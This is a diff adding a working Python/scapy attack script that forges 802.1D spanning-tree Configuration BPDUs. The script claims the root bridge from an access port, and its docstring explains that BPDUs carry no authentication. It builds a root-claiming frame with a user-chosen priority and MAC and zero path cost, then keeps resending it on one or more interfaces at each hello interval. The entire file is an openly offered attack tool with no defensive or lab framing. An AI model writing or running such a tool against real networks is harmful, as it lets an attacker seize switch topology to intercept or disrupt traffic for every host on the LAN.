@@ -1,0 +1,76 @@
+#!/usr/bin/env python3
+"""Claim the spanning-tree root by sending superior Configuration BPDUs.
+
+802.1D elects the bridge with the numerically lowest bridge ID, and a bridge ID is
+just the two-byte priority followed by the six-byte MAC. Nothing in 802.1D-1998
+authenticates a BPDU, so any host on an access port that a switch runs STP on can
+assert whatever bridge ID it likes and be believed.
+
+A claim has to be repeated: a switch ages a root out after max-age (20s by
+default) and falls back to the best BPDU it can still hear. This sends one round
+per hello interval for as long as it is told to run.
+
+Takes no defaults. Every field that decides the election is named on the command
+line.
+
+  stp-root-claim <iface>[,<iface>...] <priority> <bridge-mac> [seconds]
+
+  iface     interface(s) to send on; comma-separated to claim the root out of
+            more than one at once
+  priority  the two-byte bridge priority to claim; 802.1D compares this first and
+            lowest wins, so 0 beats any bridge that has not also chosen 0
+  mac       the six-byte half of the forged bridge ID
+  seconds   how long to keep claiming; omit to run until killed
+"""
+import sys
+import time
+
+from scapy.all import Dot3, LLC, STP, Padding, sendp
+
+
+def build(priority, mac):
+    """One Configuration BPDU claiming to be the root, and to be zero cost away.
+
+    A BPDU rides in an 802.3 frame (length, not ethertype) to the reserved
+    multicast address 01:80:c2:00:00:00, under an LLC header with the STP SAP
+    0x42. root == bridge and pathcost == 0 is what "I am the root" looks like on
+    the wire.
+    """
+    return (
+        Dot3(dst="01:80:c2:00:00:00", src=mac)
+        / LLC(dsap=0x42, ssap=0x42, ctrl=3)
+        / STP(
+            proto=0, version=0, bpdutype=0x00, bpduflags=0x00,
+            rootid=priority, rootmac=mac, pathcost=0,
+            bridgeid=priority, bridgemac=mac, portid=0x8001,
+            age=0, maxage=20, hellotime=2, fwddelay=15,
+        )
+        / Padding(load=b"\x00" * 8)
+    )
+
+
+def main():
+    if len(sys.argv) < 4:
+        sys.exit(__doc__.strip())
+    ifaces = [i for i in sys.argv[1].split(",") if i]
+    priority = int(sys.argv[2], 0)
+    mac = sys.argv[3]
+    seconds = float(sys.argv[4]) if len(sys.argv) > 4 else None
+
+    frame = build(priority, mac)
+    hello = 2
+    deadline = None if seconds is None else time.time() + seconds
+
+    rounds = 0
+    try:
+        while deadline is None or time.time() < deadline:
+            for iface in ifaces:
+                sendp(frame, iface=iface, verbose=False)
+            rounds += 1
+            time.sleep(hello)
+    except KeyboardInterrupt:
+        pass
+    print(f"claimed root {priority}/{mac} in {rounds} round(s) on {','.join(ifaces)}")
+
+
+main()
